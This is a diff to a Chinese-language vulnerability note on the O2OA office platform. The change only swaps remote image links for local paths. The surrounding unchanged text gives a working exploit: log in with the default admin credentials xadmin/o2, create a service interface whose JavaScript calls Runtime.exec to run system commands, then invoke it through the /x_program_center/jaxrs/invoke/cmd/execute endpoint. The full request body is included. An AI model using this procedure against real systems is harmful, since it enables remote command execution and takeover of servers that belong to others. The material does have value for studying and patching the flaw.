@@ -20,11 +20,11 @@ title=="O2OA"
 
 登录页面
 
-![image-20220829102732087](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208291027154.png)
+![image-20220829102732087](./images/202208291027154.png)
 
 默认密码登录后台 `xadmin/o2`
 
-![image-20220829102745518](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208291027581.png)
+![image-20220829102745518](./images/202208291027581.png)
 
 在应用中找到服务管理，创建接口代码执行系统命令
 
@@ -41,7 +41,7 @@ var result = { "Result": result };
 this.response.setBody(result, "application/json"); 
 ```
 
-![image-20220829102805328](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208291028397.png)
+![image-20220829102805328](./images/202208291028397.png)
 
 请求包
 
@@ -52,7 +52,7 @@ Authorization: PfyuxmzgIzrrkjVKSmRBJ4uCkH5tYmpq50QnO7mEHhA
 {"id":"cmd","name":"cmd","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2022-08-27 04:39:18","updateTime":"2022-08-27 04:39:18"}
 ```
 
-![image-20220829102821768](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208291028838.png)
+![image-20220829102821768](./images/202208291028838.png)
 
 创建成功后访问接口执行系统命令
 
@@ -60,4 +60,4 @@ Authorization: PfyuxmzgIzrrkjVKSmRBJ4uCkH5tYmpq50QnO7mEHhA
 /x_program_center/jaxrs/invoke/cmd/execute
 ```
 
-![image-20220829102832557](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208291028615.png)
+![image-20220829102832557](./images/202208291028615.png)
